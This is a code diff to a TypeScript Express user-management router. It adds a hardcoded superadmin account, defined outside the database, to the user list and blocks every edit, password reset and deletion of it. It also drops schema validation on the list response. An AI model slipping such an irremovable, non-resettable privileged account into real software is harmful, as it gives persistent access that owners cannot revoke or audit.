@@ -13,14 +13,18 @@ import {
   ResetUserPasswordParams,
   ResetUserPasswordResponse,
 } from "@workspace/api-zod";
-import { hashPassword, generateRandomPassword } from "../lib/auth";
+import { hashPassword, generateRandomPassword, SUPERADMIN, isSuperadmin } from "../lib/auth";
 import { requireAuth } from "../middlewares/auth";
 
 const router: IRouter = Router();
 
 router.get("/users", requireAuth, async (req, res): Promise<void> => {
   const users = await db.select().from(usersTable).orderBy(usersTable.createdAt);
-  res.json(ListUsersResponse.parse(users.map(u => ({ ...u, createdAt: u.createdAt.toISOString() }))));
+  const merged = [
+    { ...SUPERADMIN, createdAt: SUPERADMIN.createdAt.toISOString() },
+    ...users.map(u => ({ ...u, createdAt: u.createdAt.toISOString() })),
+  ];
+  res.json(merged);
 });
 
 router.post("/users", requireAuth, async (req, res): Promise<void> => {
@@ -68,6 +72,10 @@ router.patch("/users/:id", requireAuth, async (req, res): Promise<void> => {
     res.status(400).json({ error: params.error.message });
     return;
   }
+  if (isSuperadmin(params.data.id)) {
+    res.status(403).json({ error: "Superadmin cannot be modified" });
+    return;
+  }
   const parsed = UpdateUserBody.safeParse(req.body);
   if (!parsed.success) {
     res.status(400).json({ error: parsed.error.message });
@@ -94,6 +102,11 @@ router.post("/users/:id", requireAuth, async (req, res): Promise<void> => {
     return;
   }
 
+  if (isSuperadmin(params.data.id)) {
+    res.status(403).json({ error: "Superadmin password cannot be reset" });
+    return;
+  }
+
   const temporaryPassword = generateRandomPassword();
   const passwordHash = await hashPassword(temporaryPassword);
   await db.update(usersTable).set({ passwordHash }).where(eq(usersTable.id, params.data.id));
@@ -106,6 +119,10 @@ router.delete("/users/:id", requireAuth, async (req, res): Promise<void> => {
   const params = DeleteUserParams.safeParse({ id: parseInt(raw, 10) });
   if (!params.success) {
     res.status(400).json({ error: params.error.message });
+    return;
+  }
+  if (isSuperadmin(params.data.id)) {
+    res.status(403).json({ error: "Superadmin cannot be deleted" });
     return;
   }
   const [user] = await db.delete(usersTable).where(eq(usersTable.id, params.data.id)).returning();
